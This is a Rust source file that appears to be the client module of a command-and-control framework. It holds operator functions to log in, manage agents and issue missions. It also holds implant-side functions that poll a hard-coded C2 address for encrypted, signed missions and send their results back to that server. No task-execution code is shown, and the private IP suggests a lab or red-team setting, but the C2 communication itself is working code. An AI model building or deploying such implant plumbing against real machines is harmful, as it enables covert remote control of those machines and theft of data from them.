use thiserror::Error;

use crate::{crypto, model};

// const C2_URL: &str = "http://localhost:3000";
const C2_URL: &str = "http://10.211.55.2:3000";

#[derive(Debug, Error)]
pub enum ClientError {
    #[error("Failed to send request: {0}")]
    Ureq(#[from] ureq::Error),
    #[error("Failed to serialize data: {0}")]
    Serde(#[from] serde_json::Error),
    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),
    #[error("Crypto error: {0}")]
    Crypto(#[from] crypto::CryptoError),
    #[error("UTF-8 error: {0}")]
    Utf8(#[from] std::str::Utf8Error),
    #[error("Unauthorized")]
    Unauthorized,
}

pub type ClientResult<T> = Result<T, ClientError>;

const AUTHORIZATION: &str = "Authorization";

pub fn login(signing_key: &mut crypto::SigningKey) -> ClientResult<String> {
    let (_, crypto_negociation) = model::CryptoNegociation::new(signing_key);
    let response = ureq::get(C2_URL).send_json(crypto_negociation)?;

    if response.status() == 200 {
        println!("Logged in");
        Ok(response.into_json::<String>()?)
    } else {
        eprintln!("Failed to log in");
        Err(ClientError::Unauthorized)
    }
}

pub mod agents {
    use super::*;

    pub fn create(
        token: &str,
        name: String,
        identity: crypto::VerifyingKey,
        platform: model::Platform,
    ) -> ClientResult<()> {
        let response = ureq::post(&format!("{C2_URL}/agents"))
            .set(AUTHORIZATION, &format!("Bearer {token}"))
            .send_json(model::Agent {
                id: Default::default(),
                name,
                identity,
                platform,
                created_at: Default::default(),
                last_seen_at: Default::default(),
            })?;

        if response.status() == 201 {
            println!("Agent created");
        } else {
            eprintln!("Failed to create agent");
        }
        Ok(())
    }

    pub fn get(token: &str) -> ClientResult<Vec<model::Agent>> {
        let agents: Vec<model::Agent> = ureq::get(&format!("{C2_URL}/agents"))
            .set(AUTHORIZATION, &format!("Bearer {token}"))
            .call()?
            .into_json()?;
        Ok(agents)
    }

    pub fn update(token: &str, agent: &model::Agent) -> ClientResult<()> {
        if ureq::put(&format!("{C2_URL}/agents/{}", agent.id))
            .set(AUTHORIZATION, &format!("Bearer {token}"))
            .send_json(agent)?
            .status()
            == 200
        {
            println!("Agent name updated");
        } else {
            eprintln!("Failed to update agent name");
        }
        Ok(())
    }

    pub fn delete(token: &str, agent_id: i32) -> ClientResult<()> {
        if ureq::delete(&format!("{C2_URL}/agents/{agent_id}"))
            .set(AUTHORIZATION, &format!("Bearer {token}"))
            .call()?
            .status()
            == 200
        {
            println!("Agent deleted");
        } else {
            eprintln!("Failed to delete agent");
        }
        Ok(())
    }
}

pub mod missions {
    use super::*;

    pub fn issue(token: &str, agent_id: i32, task: model::Task) -> ClientResult<model::Mission> {
        let mission: model::Mission = ureq::post(&format!("{C2_URL}/missions"))
            .set(AUTHORIZATION, &format!("Bearer {token}"))
            .send_json(serde_json::to_value(&model::Mission {
                id: Default::default(),
                agent_id,
                task,
                result: None,
                issued_at: Default::default(),
                completed_at: None,
            })?)?
            .into_json()?;
        Ok(mission)
    }

    pub fn get_result(token: &str, mission_id: i32) -> ClientResult<Option<String>> {
        let response = ureq::get(&format!("{C2_URL}/missions/{mission_id}"))
            .set(AUTHORIZATION, &format!("Bearer {token}"))
            .call()?;
        if response.status() == 204 {
            Ok(None)
        } else {
            let result: Option<String> = response.into_json()?;
            Ok(result)
        }
    }

    pub fn get_next(
        signing_key: &mut crypto::SigningKey,
        c2_verifying_key: &crypto::VerifyingKey,
    ) -> ClientResult<Option<model::Mission>> {
        log::debug!("Getting mission");
        let (private_key, crypto_negociation) = model::CryptoNegociation::new(signing_key);

        let response = ureq::get(&format!("{C2_URL}/missions"))
            .set(crate::PLATFORM_HEADER, &crate::PLATFORM.to_string())
            .send_json(serde_json::to_value(&crypto_negociation)?)?;
        if response.status() == 204 {
            log::debug!("No mission");
            return Ok(None);
        }

        let crypto_message: model::CryptoMessage = response.into_json()?;
        crypto_message.verify(c2_verifying_key)?;
        let decrypted_data = crypto_message.decrypt(private_key)?;
        let mission: model::Mission =
            serde_json::from_slice(std::str::from_utf8(&decrypted_data)?.as_bytes())?;
        log::info!("Got mission: {mission}");

        Ok(Some(mission))
    }

    pub fn report(
        signing_key: &mut crypto::SigningKey,
        mission: model::Mission,
        result: &str,
    ) -> ClientResult<()> {
        log::info!("Reporting mission: {mission}");
        log::debug!("{result}");
        let (_, crypto_negociation) = model::CryptoNegociation::new(signing_key);
        let response = ureq::get(&format!("{C2_URL}/crypto/{}", mission.id))
            .send_json(serde_json::to_value(&crypto_negociation)?)?;

        if response.status() != 200 {
            log::error!("Failed to get crypto negociation");
            return Ok(());
        }

        let crypto_negociation: model::CryptoNegociation = response.into_json()?;

        crypto_negociation.verify()?;

        let response = ureq::put(&format!("{C2_URL}/missions/{}", mission.id))
            .set(crate::PLATFORM_HEADER, &crate::PLATFORM.to_string())
            .send_json(serde_json::to_value(&model::CryptoMessage::new(
                signing_key,
                crypto_negociation.public_key,
                result.as_bytes(),
            )?)?)?;

        if response.status() != 202 {
            log::error!("Failed to report mission [{}]: {:#?}", mission.id, response);
        }
        Ok(())
    }
}
